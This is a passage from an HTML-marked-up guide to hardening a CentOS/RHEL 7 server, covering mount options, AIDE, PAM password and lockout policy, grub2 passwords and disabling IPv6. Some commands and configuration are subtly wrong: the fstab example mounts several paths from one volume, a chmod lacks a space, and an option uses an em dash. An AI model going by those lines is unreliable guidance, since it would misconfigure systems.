logvol /tmp  &lt;span class=&quot;nt&quot;&gt;--fstype&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;xfs&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000 &lt;span class=&quot;nt&quot;&gt;--name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;lv_tmp &lt;span class=&quot;nt&quot;&gt;--vgname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;lg_os
logvol /var  &lt;span class=&quot;nt&quot;&gt;--fstype&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;xfs&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2000 &lt;span class=&quot;nt&quot;&gt;--name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;lv_var &lt;span class=&quot;nt&quot;&gt;--vgname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;lg_os
logvol /var/tmp  &lt;span class=&quot;nt&quot;&gt;--fstype&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;xfs&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000 &lt;span class=&quot;nt&quot;&gt;--name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;lv_var_tmp &lt;span class=&quot;nt&quot;&gt;--vgname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;lg_os
logvol /var/www  &lt;span class=&quot;nt&quot;&gt;--fstype&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;xfs&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;5000 &lt;span class=&quot;nt&quot;&gt;--name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;lv_var_www &lt;span class=&quot;nt&quot;&gt;--vgname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;lg_data
logvol /var/log  &lt;span class=&quot;nt&quot;&gt;--fstype&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;xfs&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1500 &lt;span class=&quot;nt&quot;&gt;--name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;lv_var_log &lt;span class=&quot;nt&quot;&gt;--vgname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;lg_os
logvol /var/log/audit  &lt;span class=&quot;nt&quot;&gt;--fstype&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;xfs&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;500 &lt;span class=&quot;nt&quot;&gt;--name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;lv_var_log_audit &lt;span class=&quot;nt&quot;&gt;--vgname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;lg_os
logvol swap  &lt;span class=&quot;nt&quot;&gt;--fstype&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;swap&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000 &lt;span class=&quot;nt&quot;&gt;--name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;lv_swap &lt;span class=&quot;nt&quot;&gt;--vgname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;lg_data

%packages
@core
 %end

%post
%end&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;secure-partition-mount-options&quot;&gt;Secure Partition Mount Options&lt;/h2&gt;

&lt;p&gt;Your millage will vary here, for example if you have a website that uses cgi-bin executables you won’t be able to use the &lt;strong&gt;noexec&lt;/strong&gt; mount options, but you can and should use it on /tmp and /var/tmp as this is typically the first place an attacker will attempt to write and execute from when performing privilege escalation.&lt;/p&gt;

&lt;p&gt;Your /etc/fstab file should look something like:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# /etc/fstab&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Created by anaconda on Sat Oct 11 14:28:47 2014&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Accessible filesystems, by reference, are maintained under '/dev/disk'&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
/dev/mapper/lg_os-lv_root /                       xfs     defaults        1 1
&lt;span class=&quot;nv&quot;&gt;UUID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;d73c5d22-75ed-416e-aad2-8c1bb1dfc713 /boot                   ext4    defaults,nosuid,noexec,nodev        1 2
/dev/mapper/lg_data-lv_home /home                   xfs     defaults        1 2
/dev/mapper/lg_os-lv_tmp /tmp                    xfs     defaults,nosuid,noexec,nodev        1 2
/dev/mapper/lg_os-lv_var /var                    xfs     defaults,nosuid        1 2
/dev/mapper/lg_os-lv_var_tmp /var/tmp                xfs     defaults,nosuid,noexec,nodev        1 2
/dev/mapper/lg_os-lv_var_tmp /var/log                xfs     defaults,nosuid,noexec,nodev        1 2
/dev/mapper/lg_os-lv_var_tmp /var/log/audit                xfs     defaults,nosuid,noexec,nodev        1 2
/dev/mapper/lg_data-lv_var_www /var/www                xfs     defaults,nosuid,noexec,nodev        1 2
/dev/mapper/lg_data-lv_swap swap                    swap    defaults        0 0&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;install-ntp&quot;&gt;Install NTP&lt;/h2&gt;

&lt;p&gt;NTP is required for a number of compliance audits and is general good practice.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;yum &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;ntp ntpdate
chkconfig ntpd on
ntpdate pool.ntp.org
/etc/init.d/ntpd start&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;configure-system-for-aide&quot;&gt;Configure System for AIDE&lt;/h2&gt;

&lt;p&gt;Pre-linking binaries (arguably) improved execution time, however this cause issues with AIDE, so it must be disabled.&lt;/p&gt;

&lt;p&gt;Open /etc/sysconfig/prelink and make sure the line &lt;code&gt;Set PRELINKING=no&lt;/code&gt; is present, if you’re writing a script:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# Disable prelinking altogether&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; ^PRELINKING /etc/sysconfig/prelink
&lt;span class=&quot;k&quot;&gt;then
  &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/PRELINKING.*/PRELINKING=no/g'&lt;/span&gt; /etc/sysconfig/prelink
&lt;span class=&quot;k&quot;&gt;else
  &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;# Set PRELINKING=no per security requirements&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /etc/sysconfig/prelink
  &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;PRELINKING=no&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /etc/sysconfig/prelink
&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Disable previous prelink changes to binaries:&lt;/p&gt;

&lt;section class=&quot;shellbox&quot;&gt;
    &lt;div class=&quot;unit golden-large code&quot;&gt;
      &lt;p class=&quot;title&quot;&gt;Disable previous prelink changes to binaries&lt;/p&gt;
      &lt;div class=&quot;shell&quot;&gt;
        &lt;p class=&quot;line&quot;&gt;
          &lt;span class=&quot;prompt&quot;&gt;root&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span class=&quot;path&quot;&gt;~&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;
          &lt;span class=&quot;command&quot;&gt;/usr/sbin/prelink -ua&lt;/span&gt;
        &lt;/p&gt;
        &amp;lt;/p&amp;gt;
      &lt;/div&gt;
    &lt;/div&gt;
&lt;/section&gt;

&lt;h2 id=&quot;install-aide&quot;&gt;Install AIDE&lt;/h2&gt;

&lt;p&gt;Install AIDE - Advanced Intrusion Detection Environment&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;yum &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;aide &lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; /usr/sbin/aide &lt;span class=&quot;nt&quot;&gt;--init&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /var/lib/aide/aide.db.new.gz /var/lib/aide/aide.db.gz &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; /usr/sbin/aide &lt;span class=&quot;nt&quot;&gt;--check&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Configure periodic execution of AIDE, runs every morning at 04:30&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;05 4 * * * root /usr/sbin/aide --check&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /etc/crontab&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;prevent-users-mounting-usb-storage&quot;&gt;Prevent Users Mounting USB Storage&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;install usb-storage /bin/false&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /etc/modprobe.d/usb-storage.conf&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;enable-secure-high-quality-password-policy&quot;&gt;Enable Secure (high quality) Password Policy&lt;/h2&gt;

&lt;p&gt;The following command will Enable &lt;strong&gt;SHA512&lt;/strong&gt; instead of using &lt;em&gt;MD5&lt;/em&gt;:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;authconfig &lt;span class=&quot;nt&quot;&gt;--passalgo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;sha512 —update&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;code&gt;vi /etc/security/pwquality.conf&lt;/code&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# Configuration for systemwide password quality limits&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Defaults:&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Number of characters in the new password that must not be present in the&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# old password.&lt;/span&gt;
difok &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 5
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Minimum acceptable size for the new password (plus one if&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# credits are not disabled which is the default). (See pam_cracklib manual.)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Cannot be set to lower value than 6.&lt;/span&gt;
minlen &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 14
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# The maximum credit for having digits in the new password. If less than 0&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# it is the minimum number of digits in the new password.&lt;/span&gt;
dcredit &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# The maximum credit for having uppercase characters in the new password.&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# If less than 0 it is the minimum number of uppercase characters in the new&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# password.&lt;/span&gt;
ucredit &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# The maximum credit for having lowercase characters in the new password.&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# If less than 0 it is the minimum number of lowercase characters in the new&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# password.&lt;/span&gt;
lcredit &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# The maximum credit for having other characters in the new password.&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# If less than 0 it is the minimum number of other characters in the new&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# password.&lt;/span&gt;
ocredit &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# The minimum number of required classes of characters for the new&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# password (digits, uppercase, lowercase, others).&lt;/span&gt;
minclass &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 4
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# The maximum number of allowed consecutive same characters in the new password.&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# The check is disabled if the value is 0.&lt;/span&gt;
maxrepeat &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 3
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# The maximum number of allowed consecutive characters of the same class in the&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# new password.&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# The check is disabled if the value is 0.&lt;/span&gt;
maxclassrepeat &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 3
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Whether to check for the words from the passwd entry GECOS string of the user.&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# The check is enabled if the value is not 0.&lt;/span&gt;
gecoscheck &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Path to the cracklib dictionaries. Default is to use the cracklib default.&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# dictpath =&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;secure-etclogindefs-pasword-policy&quot;&gt;Secure /etc/login.defs Pasword Policy&lt;/h2&gt;

&lt;p&gt;Add the following to &lt;code&gt;/etc/login.defs&lt;/code&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;PASS_MIN_LEN 14
PASS_MIN_DAYS 1
PASS_MAX_DAYS 60&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;set-last-logonaccess-notification&quot;&gt;Set Last Logon/Access Notification&lt;/h2&gt;

&lt;p&gt;Open &lt;code&gt;/etc/pam.d/system-auth&lt;/code&gt; and add the following line immediately after session required pam_limits.so:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;session       required     pam_lastlog.so showfailed&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;max-password-login-attempts-per-session&quot;&gt;Max Password Login Attempts per Session&lt;/h2&gt;

&lt;p&gt;Set the amount of password reprompts per session, by editing the &lt;code&gt;pam_pwquality.so&lt;/code&gt; statement in &lt;code&gt;/etc/pam.d/system-auth&lt;/code&gt; to &lt;code&gt;retry=3&lt;/code&gt; or lower.&lt;/p&gt;

&lt;h2 id=&quot;set-deny-for-failed-password-attempts&quot;&gt;Set Deny For Failed Password Attempts&lt;/h2&gt;

&lt;p&gt;Blocks logins for failed authentication on accounts.&lt;/p&gt;

&lt;p&gt;Add the following lines immediately below the &lt;code&gt;pam_unix.so&lt;/code&gt; statement in AUTH section of both &lt;code&gt;/etc/pam.d/system-auth&lt;/code&gt; and &lt;code&gt;/etc/pam.d/password-auth&lt;/code&gt;:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;auth &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;die] pam_faillock.so authfail &lt;span class=&quot;nv&quot;&gt;deny&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;3 &lt;span class=&quot;nv&quot;&gt;unlock_time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;604800 &lt;span class=&quot;nv&quot;&gt;fail_interval&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;900

auth required pam_faillock.so authsucc &lt;span class=&quot;nv&quot;&gt;deny&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;3 &lt;span class=&quot;nv&quot;&gt;unlock_time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;604800 &lt;span class=&quot;nv&quot;&gt;fail_interval&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;900&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;limit-password-reuse&quot;&gt;Limit Password Reuse&lt;/h2&gt;

&lt;p&gt;Open /etc/pam.d/system-auth, append remember=24 to the pam_unix.so line - preventing users from reusing passwords, remembering 24 times is the DoD standard.&lt;/p&gt;

&lt;p&gt;The line should look like:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;password sufficient pam_unix.so existing_options &lt;span class=&quot;nv&quot;&gt;remember&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;24&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;verify-bootgrub2grubcfg-permissions&quot;&gt;Verify /boot/grub2/grub.cfg Permissions&lt;/h2&gt;

&lt;p&gt;Set grub.conf to chmod 600:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;sudo chmod &lt;/span&gt;600/boot/grub2/grub.cfg&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;set-boot-loader-password&quot;&gt;Set Boot Loader Password&lt;/h2&gt;

&lt;p&gt;The grub2 boot loader should have a superuser account and password protection enabled to protect boot-time settings.&lt;/p&gt;

&lt;p&gt;To do so, select a superuser account and password and add them into the appropriate grub2 configuration file(s) under /etc/grub.d. Since plaintext passwords are a security risk, generate a hash for the pasword by running the following command:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;grub2-mkpasswd-pbkdf2&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;When prompted, enter the password that was selected and insert the returned password hash into the appropriate grub2 configuration file(s) under /etc/grub.d immediately after the superuser account. (Use the output from grub2-mkpasswd-pbkdf2 as the value of password-hash):&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;password_pbkdf2 superusers-accountpassword-hash&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;div class=&quot;note tip&quot;&gt;
  &lt;h5&gt;Don't use common admin account names for the grub2 superuser&lt;/h5&gt;
  &lt;p&gt;Avoid using common admin account names like, root, admin or administrator for the grub2 superuser account. To meet FISMA Moderate, the bootloader superuser account password &lt;b&gt;must differ&lt;/b&gt; from the root credentials.&lt;/p&gt;
&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;grub2-mkconfig &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; /boot/grub2/grub.cfg&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;div class=&quot;note warning&quot;&gt;
  &lt;h5&gt;Don't manually add the superuser account to grub.cfg &lt;/h5&gt;
  &lt;p&gt;Do NOT manually add the superuser account and password to the grub.cfg file as the grub2-mkconfig command overwrites this file.&lt;/p&gt;
&lt;/div&gt;

&lt;h2 id=&quot;require-authentication-for-single-user-mode&quot;&gt;Require Authentication for Single User Mode&lt;/h2&gt;

&lt;p&gt;Require root password when entering single user mode, open &lt;code&gt;/etc/sysconfig/init&lt;/code&gt; and add the line:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;SINGLE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/sbin/sulogin&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;disable-ctrl-alt-del-reboot-activation&quot;&gt;Disable Ctrl-Alt-Del Reboot Activation&lt;/h2&gt;

&lt;p&gt;Prevernt ALT+CTRL+DEL from rebooting.&lt;/p&gt;

&lt;p&gt;Open &lt;code&gt;/etc/init/control-alt-delete.conf&lt;/code&gt; and modify the existing line:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt; /sbin/shutdown &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; now &lt;span class=&quot;s2&quot;&gt;&quot;Control-Alt-Delete pressed&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;To:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt; /usr/bin/logger &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; security.info &lt;span class=&quot;s2&quot;&gt;&quot;Control-Alt-Delete pressed&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;enable-console-screen-locking&quot;&gt;Enable Console Screen Locking&lt;/h2&gt;

&lt;p&gt;Install the screen Package to allow console screen locking.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;yum &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;screen&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Users can now run &lt;code&gt;screen&lt;/code&gt; and lock the console with &lt;code&gt;ctrl+a x&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;disable-zeroconf-networking&quot;&gt;Disable Zeroconf Networking&lt;/h2&gt;

&lt;p&gt;Zeroconf network typically occours when you fail to get an address via DHCP, the interface will be assigned a 169.254.0.0 address.&lt;/p&gt;

&lt;p&gt;To prevernt this:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;NOZEROCONF=yes&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /etc/sysconfig/network&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;disable-ipv6-support-automatically-loading&quot;&gt;Disable IPv6 Support Automatically Loading&lt;/h2&gt;

&lt;p&gt;Open &lt;code&gt;/etc/modprobe.d/disabled.conf&lt;/code&gt; and add the line:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;options ipv6 &lt;span class=&quot;nv&quot;&gt;disable&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;disable-interface-usage-of-ipv6&quot;&gt;Disable Interface Usage of IPv6&lt;/h2&gt;

&lt;p&gt;Add the following to &lt;code&gt;/etc/sysconfig/network&lt;/code&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;NETWORKING_IPV6&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;no
&lt;span class=&quot;nv&quot;&gt;IPV6INIT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;no&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;disable-support-for-rpc-ipv6&quot;&gt;Disable Support for RPC IPv6&lt;/h2&gt;

&lt;p&gt;RPC services like NFSv4 attempt to start using IPv6 even if it’s disabled in &lt;code&gt;/etc/modprobe.d&lt;/code&gt;. To prevent this behaviour open &lt;code&gt;/etc/netconfig&lt;/code&gt; and comment the following lines:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;udp6       tpi_clts      v     inet6    udp     -       -
tcp6       tpi_cots_ord  v     inet6    tcp     -       -&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;securing-root-logins&quot;&gt;Securing root Logins&lt;/h2&gt;

&lt;p&gt;Only allow root logins via local terminal:&lt;/p&gt;

